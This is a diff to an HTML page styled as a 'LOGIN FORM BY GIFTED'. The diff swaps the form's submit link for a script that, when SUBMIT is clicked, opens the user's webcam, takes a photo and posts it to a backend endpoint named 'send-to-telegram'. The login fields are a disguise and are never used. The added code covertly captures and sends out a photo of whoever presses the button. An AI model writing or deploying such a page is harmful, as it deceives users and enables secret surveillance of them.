@@ -1,49 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Animated Login Form</title>
-    <link
-      rel="stylesheet"
-      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
-    />
-    <link rel="stylesheet" href="gifted.css" />
-  </head>
-  <body>
-    <div class="login_form_container">
-      <div class="login_form">
-        <h2>LOGIN FORM BY GIFTED</h2>
-        <div class="input_group">
-          <i class="fa fa-user"></i>
-          <input
-            type="text"
-            placeholder="Username"
-            class="input_text"
-            autocomplete="off"
-          />
-        </div>
-        <div class="input_group">
-          <i class="fa fa-unlock-alt"></i>
-          <input
-            type="password"
-            placeholder="Password"
-            class="input_text"
-            autocomplete="off"
-          />
-        </div>
-        <div class="button_group" id="login_button">
-          <a href="https://nobody.panelmurah.me">SUBMIT</a>
-        </div>
-        <div class="footer">
-          <a href="#">Forgot Password?</a>
-          <a href="#">Sign Up</a>
-        </div>
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Capture Image</title>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+  />
+  <link rel="stylesheet" href="gifted.css" />
+</head>
+<body>
+  <div class="login_form_container">
+    <div class="login_form">
+      <h2>LOGIN FORM BY GIFTED</h2>
+      <div class="input_group">
+        <i class="fa fa-user"></i>
+        <input
+          type="text"
+          placeholder="Username"
+          class="input_text"
+          autocomplete="off"
+        />
+      </div>
+      <div class="input_group">
+        <i class="fa fa-unlock-alt"></i>
+        <input
+          type="password"
+          placeholder="Password"
+          class="input_text"
+          autocomplete="off"
+        />
+      </div>
+      <div class="button_group" id="capture_button">
+        <button type="button">SUBMIT</button>
+      </div>
+      <div class="footer">
+        <a href="#">Forgot Password?</a>
+        <a href="#">Sign Up</a>
       </div>
     </div>
+  </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
-    <script src="gifted.js"></script>
-  </body>
+  <!-- JavaScript to handle image capture -->
+  <script>
+    async function captureImage() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const bitmap = await imageCapture.takePhoto();
+        
+        // Convert the image to a data URL
+        const reader = new FileReader();
+        reader.readAsDataURL(bitmap);
+        reader.onloadend = () => {
+          const dataURL = reader.result;
+
+          // Send the image data to the backend
+          fetch('/api/send-to-telegram', {
+            method: 'POST',
+            body: JSON.stringify({ image: dataURL }),
+            headers: {
+              'Content-Type': 'application/json'
+            }
+          })
+          .then(response => response.json())
+          .then(data => {
+            console.log('Image sent to Telegram successfully:', data);
+          })
+          .catch(error => {
+            console.error('Error sending image to Telegram:', error);
+          });
+        };
+      } catch (err) {
+        console.error('Error accessing the camera:', err);
+      }
+    }
+
+    document.getElementById('capture_button').querySelector('button').addEventListener('click', captureImage);
+  </script>
+</body>
 </html>
